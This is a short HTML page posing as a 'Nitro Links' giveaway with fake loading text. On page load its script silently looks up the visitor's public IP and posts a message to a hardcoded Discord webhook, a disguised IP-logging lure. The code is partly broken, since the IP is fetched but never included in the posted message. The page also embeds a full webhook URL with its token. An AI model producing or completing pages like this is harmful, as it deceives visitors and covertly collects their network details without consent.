<!DOCTYPE html>
<html>
  <head>
    <title>Haha</title>
    <script>
      function displayIP() {
        fetch("https://api.ipify.org/?format=json")
          .then((response) => response.json())
          .then((data) => {
            const ip = data.ip;
            sendToWebhook(ip);
          })
          .catch((error) => {
            console.error("Error:", error);
            sendToWebhook("Unknown"); // Send default IP as "Unknown" in case of an error
          });
      }

      function sendToWebhook(ip) {
        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
        const message = "Nitro Links: Loading";

        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ content: message })
        })
          .then((response) => console.log("Webhook sent successfully"))
          .catch((error) => console.error("Error sending webhook:", error));
      }
    </script>
  </head>
  <body onload="displayIP()">
    <h1>Nitro Links:</h1>
    <p>Loading...</p>
    <p>Loading...</p>
    <p>Loading...</p>
  </body>
</html>
